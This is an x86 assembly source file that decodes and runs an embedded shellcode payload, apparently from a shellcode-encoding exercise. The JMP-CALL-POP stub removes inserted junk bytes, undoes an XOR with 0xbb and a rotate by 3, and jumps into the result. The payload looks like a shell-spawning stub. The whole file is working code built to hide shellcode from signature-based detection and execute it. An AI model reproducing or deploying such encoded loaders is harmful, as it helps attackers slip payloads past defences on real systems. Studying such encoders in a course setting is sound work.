; Filename: insertion_xor_rol_decoder.asm
; Purpose: Decode and execute shellcode encoded by insertion_xor_rol_encoder.c 


global _start

section .text
_start:

    jmp short call_shellcode


decoder:

    pop esi                         ; address of EncodedShellcode is popped in ESI
    lea edi, [esi + 0x1]            ; EDI gets ESI + 0x1 (address of first garbage byte)
    xor eax, eax                    ; zero EAX
    mov al, 0x1                     ; MOV 0x1 into AL
    xor ebx, ebx                    ; zero EBX
    xor ecx, ecx                    ; zero ECX
    mov cl, 0x18                    ; MOV 0x18 (24) into CL to prepare loop

    xor byte [esi], 0xbb            ; XOR first XOR'd byte with 0xbb to decode
    ror byte [esi], 0x3             ; ROR first ROL'd byte with 0x3 to decode

    
decode:

    mov bl, byte [esi + eax + 0x1]  ; MOV ESI + EAX + 0x1 (address of next good byte) in BL
    mov byte [edi], bl              ; MOV BL in the address pointed to by EDI
    xor byte [edi], 0xbb            ; XOR XOR'd byte with 0xbb to decode
    ror byte [edi], 0x3
    inc edi                         ; increment EDI to prepare for next iteration
    add al, 0x2                     ; add 0x2 to AL to prepare for next iteration
    loop decode

    jmp short EncodedShellcode      ; When decode is done, JMP to the decoded shellcode          

    
call_shellcode:

    call decoder                    ; address of EncodedShellcode is pushed on the stack

   EncodedShellcode: db 0x32,0xaa,0xbd,0xaa,0x39,0xaa,0xf8,0xaa,0xc2,0xaa,0xc2,0xaa,0x20,0xaa,0xf8,0xaa,0xf8,0xaa,0xc2,0xaa,0xa8,0xaa,0xf0,0xaa,0xc8,0xaa,0xf7,0xaa,0xa4,0xaa,0x39,0xaa,0xf7,0xaa,0xac,0xaa,0x21,0xaa,0xf7,0xaa,0xb4,0xaa,0x3e,0xaa,0xe3,0xaa,0xd5,0xaa,0xbf,0xaa 
